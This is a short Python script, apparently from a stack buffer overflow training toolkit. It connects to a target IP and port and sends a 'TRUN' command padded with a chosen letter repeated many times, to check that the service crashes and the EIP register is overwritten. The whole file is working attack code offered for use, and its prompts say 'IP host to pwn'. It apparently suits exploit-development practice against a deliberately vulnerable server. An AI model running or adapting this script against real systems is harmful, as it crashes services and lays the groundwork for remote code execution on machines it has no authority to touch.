#!/usr/bin/python3
#_*_ coding: utf8 _*_
#Coded by @JoshuaProvoste

import socket,argparse

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""

def hi():
	print("""
 __      __       _  __ _           
 \ \    / /      (_)/ _(_)          
  \ \  / /__ _ __ _| |_ _  ___ _ __ 
   \ \/ / _ \ '__| |  _| |/ _ \ '__|
    \  /  __/ |  | | | | |  __/ |   
     \/ \___|_|  |_|_| |_|\___|_|   
Verification the amount of characters!                                                                                     
	""")

parser = argparse.ArgumentParser()
parser.add_argument("-ip","--host", type=str, required=True, help="IP host to pwn")
parser.add_argument("-sp","--port", type=int, required=True, help="Port of vulnerable service")
parser.add_argument("-lt","--letter", type=str, required=True, help="Specific letter to overwrite the EIP")
parser.add_argument("-ac","--amount", type=int, required=True, help="Amount of characters to verify a crash an EIP overwritten")
args = parser.parse_args()

command = "TRUN"
junk = "/.:/"

if args.host and args.port and args.letter and args.amount:
    hi()

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((args.host,args.port))
    sock.recv(1024)

    characters = args.letter * args.amount
    payload = command + " " + junk + characters
    sock.send(payload.encode("utf-8"))
    
    print("Buffering with: "+str(len(characters))+" characters...",end="\r")
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    print("\nPwned? Maybe the binary crashed with "+str(len(characters))+" \"A\" characters :)")
    exit()
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()